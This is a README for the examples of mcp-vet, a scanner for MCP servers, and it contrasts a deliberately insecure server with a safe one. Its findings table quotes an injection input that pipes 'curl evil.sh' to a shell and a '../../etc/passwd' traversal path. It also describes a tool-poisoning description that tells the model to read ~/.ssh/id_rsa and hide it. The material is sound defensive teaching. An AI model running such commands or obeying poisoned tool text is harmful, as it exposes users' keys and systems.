# Examples

Two small MCP servers and a client config, so you can see what mcp-vet reports and how each problem is fixed.

```bash
mcp-vet examples/vulnerable-server     # fails: critical and high findings
mcp-vet examples/safe-server           # passes: no findings
mcp-vet examples/vulnerable-server -v  # shows the offending code and how to fix each rule
```

> `vulnerable-server` is **deliberately insecure**. It exists only to be scanned. Never run it or deploy it.

## What each finding means, and the fix

| Finding in `vulnerable-server` | What an attacker can do | How `safe-server` avoids it |
|---|---|---|
| **MCP003** hardcoded key in `server.py` | Anyone who can read the repository can use the key | Load secrets from the environment; never commit them |
| **MCP002** `<IMPORTANT>` block in the `add` tool description | The text is read by the model, not the user, and tells it to read `~/.ssh/id_rsa` and hide that from you (tool poisoning) | Tool descriptions say what the tool does and nothing else |
| **MCP001** `subprocess.run(f"... {name}", shell=True)` | A tool argument such as `x; curl evil.sh \| sh` runs as a shell command | Pass an argument list, validate the name against an allowlist |
| **MCP005** `open(path)` | A path like `../../etc/passwd` reads any file the server can reach | Resolve the path and check it stays inside one folder (`is_relative_to`) |
| **MCP004** SSE on `0.0.0.0` with no authentication | Anyone on the network can call your tools | Use stdio, or bind to `127.0.0.1` and require a token |
| **MCP007** `"/"` in `mcp-config.json` | The filesystem server can read your whole disk | Scope it to a single project folder |
| **MCP006** `"latest"` and unpinned requirements | A compromised release is installed silently | Pin exact versions and commit a lockfile |

## Compare the two servers

The fixes are small. For example, the file-read tool:

```python
# vulnerable-server/server.py
@mcp.tool()
def read_note(path: str) -> str:
    with open(path) as fh:
        return fh.read()

# safe-server/server.py
@mcp.tool()
def read_note(name: str) -> str:
    target = (NOTES_ROOT / name).resolve()
    if not target.is_relative_to(NOTES_ROOT):
        raise ValueError("path outside notes root")
    return target.read_text()
```

Run `diff -u examples/vulnerable-server/server.py examples/safe-server/server.py` to see all of them.

## Using these as a test of your own CI

The repository's CI runs the GitHub Action against both folders and requires the vulnerable one to **fail** the gate. If you adopt mcp-vet in a pipeline, that check is a good one to copy: it tells you the scanner is still doing its job.
